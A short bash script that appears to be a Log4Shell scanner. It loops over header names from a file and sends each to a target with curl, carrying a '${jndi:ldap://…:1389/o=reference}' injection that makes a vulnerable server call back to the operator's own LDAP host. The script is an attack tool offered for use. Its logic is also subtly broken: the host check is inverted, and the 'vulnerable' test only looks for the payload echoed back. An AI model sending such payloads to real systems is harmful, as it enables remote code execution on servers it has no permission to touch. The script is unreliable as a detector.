#!/usr/bin/env bash

NC=$'\e[0m' # No Color
BOLD=$'\033[1m'
UNDERLINE=$'\033[4m'
RED=$'\e[31m'
GREEN=$'\e[32m'
BLUE=$'\e[34m'
ORANGE=$'\x1B[33m'

# raise error
function raise_error(){
  echo -e "${BOLD}${RED}${1}${NC}" >&2
  exit 1
}

host=$1
[ -z $host ] || raise_error "Host parameter Missing"
host_ip="$(ifconfig | grep "inet " | grep -Fv 127.0.0.1 | awk '{print $2}')"

sed 1d headers-large.txt | while IFS= read -r header
do
  malicious_packet="$header: \${jndi:ldap://$host_ip:1389/o=reference}"
  response=$(curl  -s -H "$malicious_packet" "$host")
  response_check=$(echo $response | awk '{print $3}')
  if [  $response_check = "\${jndi:ldap://$host_ip:1389/o=reference}" ]; then 
    echo -e "${BOLD}${RED}\nVulnerable for header ->${NC} $header\n"
  fi 
done 
IFS=$OLDIFS